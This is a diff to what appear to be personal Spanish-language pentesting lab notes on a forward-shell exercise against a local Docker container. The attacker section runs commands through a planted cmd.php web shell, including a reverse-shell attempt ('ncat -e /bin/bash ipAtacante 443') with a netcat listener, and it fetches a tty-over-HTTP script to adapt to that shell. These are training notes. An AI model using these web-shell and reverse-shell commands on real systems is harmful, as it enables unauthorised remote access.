@@ -1958,7 +1958,7 @@ script /dev/null -c bash # Para ver de mejor manera la consola
 ```bash
 # Ejercicio Forward Shell
 # Dos paneles
-# Panel de Victima
+# PANEL DE VICTIMA
 nvim Dockerfile
 
 ----- Dockerfile
@@ -2010,13 +2010,19 @@ iptables -A OUTPUT -o eth0 -j DROP
 
 
 
-# Panel de atacante
+# PANEL DE ATACANTE
 docker port myContainer # Vemos el puerto expuesto, vamos al navegador para corrobora el apaches corriendo
 # Vamos a localhost:80
 # En el navegador damos clic en cmd.php
 # En la url hacamos lo siguiente
 localhost/cmd.php?cmd=whoami # Responde con www-data
 localhost/cmd.php?cmd=ncat -e /bin/bash ipAtacante 443 #Nos ponemos en escucha en cmd
-
 nc -nlvp 443 # No deberia estar entablando la conexión 
+# vamos al enlace de s4vitar para descargar script mkfifo y obtener tty
+# https://github.com/s4vitar/ttyoverhttp
+# https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py
+wget https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py
+# Editamos el archivo para cambiar index.html -> cmd.php el cual es el nombre del script que logramos colar en el servidor
+nano tty_over_http.py
+
 ```
